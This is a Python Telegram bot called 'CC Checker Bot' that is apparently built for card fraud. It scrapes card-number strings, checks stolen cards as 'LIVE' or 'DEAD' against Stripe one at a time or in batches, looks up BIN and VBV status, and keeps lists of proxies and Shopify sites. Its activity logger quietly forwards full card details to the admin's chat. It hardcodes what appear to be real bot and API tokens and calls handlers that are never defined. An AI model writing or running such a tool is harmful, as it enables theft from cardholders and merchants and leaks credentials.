#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import logging
import re
import random
import asyncio
import aiohttp
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN","8497098081:AAFNQzwZxn-7vhTnR0d5fEUmvzDuQ4UEpGk")
ADMIN_USER_ID = int(os.getenv("ADMIN_USER_ID", "729412805"))
BINCODES_API_KEY = os.getenv("BINCODES_API_KEY","425be7cdecc63d7a92ebe8e9bc6773a0")
BOT_VERSION = "3.0"

# Store user data separately for privacy
user_api_keys = {}
user_proxies = {}
user_sites = {}
user_activity_log = []

# Default proxies and sites which user can extend
DEFAULT_PROXIES = [
    "103.152.112.162:80",
    "190.61.41.106:999",
    "185.217.143.96:80"
]

DEFAULT_SHOPIFY_SITES = [
    "https://cnocoutdoors.com",
    "https://southernrootscoffee.com",
    "https://championtrophies.com",
    "https://kingdomcomecards.com"
]

def is_admin(user_id):
    return user_id == ADMIN_USER_ID

async def notify_admin(context, message):
    try:
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text=message, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Failed admin notify: {e}")

async def log_activity(context, user_id, username, action, details="", sensitive=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_activity_log.append({
        "timestamp": timestamp,
        "user_id": user_id,
        "username": username,
        "action": action,
        "details": details,
        "sensitive": sensitive
    })
    msg = f"*User Activity*\n\nUser: @{username}\nID: `{user_id}`\nAction: {action}\nDetails: {details}"
    if sensitive:
        msg += f"\nSensitive:\n``````"
    msg += f"\nTime: {timestamp}"
    await notify_admin(context, msg)

def get_user_keys(user_id):
    return user_api_keys.get(user_id, {
        "stripe": None,
        "paypal_id": None,
        "paypal_secret": None,
        "razorpay_id": None,
        "razorpay_secret": None
    })

def set_user_key(user_id, gateway, key_type, value):
    if user_id not in user_api_keys:
        user_api_keys[user_id] = {}
    if gateway == "stripe":
        user_api_keys[user_id]["stripe"] = value
    elif gateway == "paypal":
        if key_type == "id":
            user_api_keys[user_id]["paypal_id"] = value
        elif key_type == "secret":
            user_api_keys[user_id]["paypal_secret"] = value
    elif gateway == "razorpay":
        if key_type == "id":
            user_api_keys[user_id]["razorpay_id"] = value
        elif key_type == "secret":
            user_api_keys[user_id]["razorpay_secret"] = value

def add_user_proxy(user_id, proxy):
    proxies = user_proxies.setdefault(user_id, DEFAULT_PROXIES.copy())
    if proxy not in proxies:
        proxies.append(proxy)
        return True
    return False

def get_user_proxies(user_id):
    return user_proxies.get(user_id, DEFAULT_PROXIES.copy())

def add_user_site(user_id, site):
    sites = user_sites.setdefault(user_id, DEFAULT_SHOPIFY_SITES.copy())
    if site not in sites:
        sites.append(site)
        return True
    return False

def get_user_sites(user_id):
    return user_sites.get(user_id, DEFAULT_SHOPIFY_SITES.copy())

def luhn_check(card_number):
    digits = [int(d) for d in card_number]
    checksum = 0
    oddeven = len(digits) & 1
    for count in range(len(digits)):
        digit = digits[count]
        if not ((count & 1) ^ oddeven):
            digit = digit * 2
            if digit > 9:
                digit -= 9
        checksum += digit
    return (checksum % 10) == 0

async def check_stripe(card, stripe_key):
    if not stripe_key:
        return {'status': 'error', 'message': 'Set Stripe key first via /setstripekey'}
    url = "https://api.stripe.com/v1/tokens"
    data = {
        "card[number]": card["card_number"],
        "card[exp_month]": card["exp_month"],
        "card[exp_year]": card["exp_year"],
        "card[cvc]": card["cvv"],
    }
    headers = {
        "Authorization": f"Bearer {stripe_key}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=data, headers=headers, timeout=15) as resp:
                resp_json = await resp.json()
                if resp.status == 200 and "id" in resp_json:
                    return {"status": "approved", "message": "Valid card"}
                elif resp.status == 402:
                    return {"status": "declined", "message": "Card declined"}
                elif resp.status == 401:
                    return {"status": "error", "message": "Invalid Stripe Key"}
                else:
                    return {"status": "error", "message": resp_json.get("error", {}).get("message", "Declined")}
    except Exception as e:
        return {"status": "error", "message": str(e)}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await log_activity(context, user.id, user.username or "Unknown", "Started Bot")
    if user.id not in user_proxies:
        user_proxies[user.id] = DEFAULT_PROXIES.copy()
    if user.id not in user_sites:
        user_sites[user.id] = DEFAULT_SHOPIFY_SITES.copy()

    keyboard = [
        [InlineKeyboardButton("Set Keys", callback_data="keys"), InlineKeyboardButton("Commands", callback_data="commands")],
        [InlineKeyboardButton("Proxies", callback_data="proxies"), InlineKeyboardButton("Sites", callback_data="sites")],
        [InlineKeyboardButton("Check Card", callback_data="check"), InlineKeyboardButton("BIN Lookup", callback_data="bin")],
    ]
    if is_admin(user.id):
        keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin")])

    await update.message.reply_text(
        f"*CC Checker Bot v{BOT_VERSION}*\nWelcome {user.first_name}!\nID: `{user.id}`",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    # Implement your callback button logic here...

async def setstripekey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not context.args:
        await update.message.reply_text("Use /setstripekey <key>")
        return
    key = context.args[0].strip()
    if not key.startswith("sk_"):
        await update.message.reply_text("Invalid key: Must start with sk_")
        return
    set_user_key(user.id, "stripe", None, key)
    await log_activity(context, user.id, user.username or "Unknown", "Set Stripe Key")
    await update.message.reply_text(f"Stripe key saved: {key[:10]}...")

async def scrape_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = ' '.join(context.args)
    if not text:
        await update.message.reply_text("कृपया CC स्क्रैप करने के लिए कार्ड्स या टेक्स्ट डालें।")
        return
    
    pattern = r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    
    valid_cards = []
    for card, mm, yyyy, cvv in matches:
        if luhn_check(card):
            yyyy = yyyy if len(yyyy) == 4 else "20"+yyyy
            valid_cards.append(f"{card}|{mm.zfill(2)}|{yyyy}|{cvv}")
    
    if not valid_cards:
        await update.message.reply_text("कोई मान्य कार्ड नहीं मिला।")
        return
    
    await log_activity(context, update.effective_user.id, update.effective_user.username or "unknown",
                       "Scraped cards", f"Found {len(valid_cards)} valid cards", "\n".join(valid_cards))
    
    message = f"✅ *स्क्रैप किए गए कार्ड्स ({len(valid_cards)}):*\n"
    message += "\n".join(f"{idx+1}. `{c}`" for idx, c in enumerate(valid_cards[:20]))
    if len(valid_cards) > 20:
        message += f"\n...और {len(valid_cards)-20} कार्ड्स"
    
    await update.message.reply_text(message, parse_mode="Markdown")

async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not context.args:
        await update.message.reply_text("प्रॉक्सी जोड़ने का Usage:\n/addproxy IP:PORT")
        return
    proxy = context.args[0].strip()
    if ':' not in proxy:
        await update.message.reply_text("गलत फ़ॉर्मैट! IP:PORT यूज़ करें।")
        return
    success = add_user_proxy(user.id, proxy)
    if success:
        await log_activity(context, user.id, user.username or "unknown", "Added proxy", proxy)
        await update.message.reply_text(f"✅ प्रॉक्सी जोड़ी गई: `{proxy}`")
    else:
        await update.message.reply_text("⛔ यह प्रॉक्सी पहले से मौजूद है।")

async def myproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    proxies = get_user_proxies(user.id)
    if not proxies:
        await update.message.reply_text("आपके पास कोई प्रॉक्सी नहीं। /addproxy से जोड़ें।")
        return
    msg = "*आपकी प्रॉक्सी:\n\n*"
    for i, p in enumerate(proxies[:20], 1):
        msg += f"{i}. `{p}`\n"
    await update.message.reply_text(msg, parse_mode="Markdown")

async def addsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not context.args:
        await update.message.reply_text("साइट जोड़ने का Usage:\n/addsite https://example.com")
        return
    site = context.args[0].strip()
    if not (site.startswith("http://") or site.startswith("https://")):
        await update.message.reply_text("⚠️ URL सही फ़ॉर्मैट नही है।")
        return
    success = add_user_site(user.id, site)
    if success:
        await log_activity(context, user.id, user.username or "unknown", "Added site", site)
        await update.message.reply_text(f"✅ साइट जोड़ी गई: {site}")
    else:
        await update.message.reply_text("⛔ साइट पहले से मौजूद है।")

async def mysites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    sites = get_user_sites(user.id)
    if not sites:
        await update.message.reply_text("आपके पास कोई साइट नहीं है, /addsite से जोड़ें।")
        return
    msg = "*आपकी साइट्स:\n\n*"
    for i, s in enumerate(sites[:20], 1):
        msg += f"{i}. {s}\n"
    await update.message.reply_text(msg, parse_mode="Markdown")

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Use: /mass card1|mm|yyyy|cvv card2|mm|yyyy|cvv ... Max 50 cards", parse_mode="Markdown")
        return
    cards = []
    for arg in context.args[:50]:
        parts = arg.split("|")
        if len(parts) != 4 or not luhn_check(parts[0]):
            continue
        cards.append({
            "card_number": parts[0],
            "exp_month": parts[1],
            "exp_year": parts[2],
            "cvv": parts[3]
        })
    if not cards:
        await update.message.reply_text("No valid cards found to check.", parse_mode="Markdown")
        return
    await update.message.reply_text(f"Checking {len(cards)} cards...")
    keys = get_user_keys(update.effective_user.id)
    results = []
    for card in cards:
        result = await check_stripe(card, keys.get("stripe"))
        results.append(f"{card['card_number'][:4]}****{card['card_number'][-4:]} : {result['status']}")
        await asyncio.sleep(0.5)
    final_msg = "*Mass Check Results*\n" + "\n".join(results)
    await update.message.reply_text(final_msg, parse_mode="Markdown")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("Unauthorized!")
        return
    total_users = len(user_api_keys)
    total_proxies = sum(len(v) for v in user_proxies.values())
    total_sites = sum(len(v) for v in user_sites.values())
    msg = (
        f"*Admin Stats:*\n"
        f"Total Users: {total_users}\n"
        f"Total Proxies: {total_proxies}\n"
        f"Total Sites: {total_sites}\n"
        f"Total Activity Logs: {len(user_activity_log)}"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

async def allusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("Unauthorized!")
        return
    msg = "*All Users API Keys Overview*\n"
    for uid, keys in user_api_keys.items():
        status = "".join([
            "S" if keys.get("stripe") else "-",
            "P" if keys.get("paypal_id") else "-",
            "R" if keys.get("razorpay_id") else "-",
        ])
        msg += f"UserID: `{uid}`, Keys: {status}\n"
    await update.message.reply_text(msg, parse_mode="Markdown")

async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not context.args:
        await update.message.reply_text("Usage:\n/kill card|mm|yyyy|cvv")
        return
    
    card_data = " ".join(context.args).split("|")
    if len(card_data) != 4 or not luhn_check(card_data[0]):
        await update.message.reply_text("Invalid card format or Luhn check failed.")
        return
    
    card = {
        "card_number": card_data[0],
        "exp_month": card_data[1],
        "exp_year": card_data[2],
        "cvv": card_data[3]
    }
    
    keys = get_user_keys(user.id)
    await update.message.reply_text("Checking card live status...")
    result = await check_stripe(card, keys.get("stripe"))
    
    if result["status"] == "approved":
        await update.message.reply_text(f"✅ Card is LIVE: {card['card_number'][:4]}****{card['card_number'][-4:]}")
    elif result["status"] == "declined":
        await update.message.reply_text(f"❌ Card is DEAD: {card['card_number'][:4]}****{card['card_number'][-4:]}")
    else:
        await update.message.reply_text(f"⚠️ Error: {result['message']}")

async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage:\n/bin <6-8 digit BIN>")
        return
    bin_num = context.args[0]
    if not bin_num.isdigit() or not (6 <= len(bin_num) <= 8):
        await update.message.reply_text("Invalid BIN. Must be 6 to 8 digits.")
        return
    
    url = f"https://api.bincodes.com/bin/?format=json&api_key={BINCODES_API_KEY}&bin={bin_num}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                data = await response.json()
                if "valid" in data and data["valid"] != "false":
                    msg = (
                        f"✅ BIN: {bin_num}\n"
                        f"Bank: {data.get('bank', 'N/A')}\n"
                        f"Country: {data.get('country', 'N/A')}\n"
                        f"Brand: {data.get('brand', 'N/A')}\n"
                        f"Type: {data.get('type', 'N/A')}\n"
                        f"Level: {data.get('level', 'N/A')}\n"
                        f"VBV: {'VBV' if 'VBV' in data.get('level', '').upper() else 'Non-VBV'}"
                    )
                else:
                    msg = "BIN not found or invalid."
                await update.message.reply_text(msg)
    except Exception as e:
        await update.message.reply_text(f"Error fetching BIN info: {str(e)}")

def register_handlers(app):
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setstripekey", setstripekey_command))
    app.add_handler(CommandHandler("scrape", scrape_command))
    app.add_handler(CommandHandler("addproxy", addproxy_command))
    app.add_handler(CommandHandler("myproxies", myproxies_command))
    app.add_handler(CommandHandler("addsite", addsite_command))
    app.add_handler(CommandHandler("mysites", mysites_command))
    app.add_handler(CommandHandler("kill", kill_command))
    app.add_handler(CommandHandler("bin", bin_command))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("allusers", allusers_command))
    app.add_handler(CommandHandler("viewkeys", viewkeys_command))
    app.add_handler(CommandHandler("viewcards", viewcards_command))
    app.add_handler(CallbackQueryHandler(button_callback))  # For inline buttons

def main():
    if not TELEGRAM_BOT_TOKEN:
        logger.error("TELEGRAM_BOT_TOKEN environment variable missing")
        sys.exit(1)

    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    register_handlers(application)
    logger.info(f"Starting premium bot v{BOT_VERSION}")
    try:
        application.run_polling()
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Critical error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
